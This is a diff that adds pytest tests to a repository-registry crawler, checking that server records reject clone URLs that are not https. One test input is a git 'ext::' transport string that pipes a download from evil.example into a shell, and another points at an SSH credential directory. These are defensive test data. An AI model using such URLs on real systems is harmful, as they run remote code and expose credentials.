@@ -11,6 +11,7 @@ from analyzer.crawler.registry import (
     ServerRecord,
     crawl_registry,
     iter_servers,
+    permits_cloning,
 )
 
 # A verbatim capture of the live registry, trimmed to four entries covering the
@@ -339,3 +340,39 @@ def test_skipping_counts_every_unusable_repository_shape() -> None:
     assert crawl.entries_seen == 7
     assert crawl.skipped_without_source == 6
     assert len(crawl.records) == 1
+
+
+@pytest.mark.parametrize(
+    "url",
+    [
+        "http://github.com/owner/repo",
+        "file:///home/runner/.ssh",
+        "ext::sh -c 'curl evil.example | sh'",
+        "git://github.com/owner/repo",
+        "ssh://git@github.com/owner/repo",
+        "",
+    ],
+)
+def test_a_record_cannot_be_built_with_a_url_the_fetcher_must_not_clone(url: str) -> None:
+    """The scheme rule belongs to the record, not to one of its producers.
+
+    It lived in the registry parser, which protected the registry and nothing
+    else. `load_server_index` reads records from a file and reaches the same
+    fetcher, so a hand-edited index was a second way in with no check on it at
+    all. Validating at construction covers every producer, including ones not
+    written yet.
+    """
+    with pytest.raises(ValueError, match="https"):
+        ServerRecord(server_id="attacker/controlled", repo_url=url, discovered_via="registry")
+
+
+def test_the_registry_skips_what_the_record_would_refuse() -> None:
+    """One rule, two behaviours, and they have to agree.
+
+    A non-https entry is a fact about one server and is skipped rather than
+    fatal, so the parser asks the same question the constructor does instead of
+    carrying its own copy of the answer. If the two ever disagree the crawl
+    dies on a record it used to skip.
+    """
+    assert not permits_cloning("file:///home/runner/.ssh")
+    assert permits_cloning("https://github.com/owner/repo")
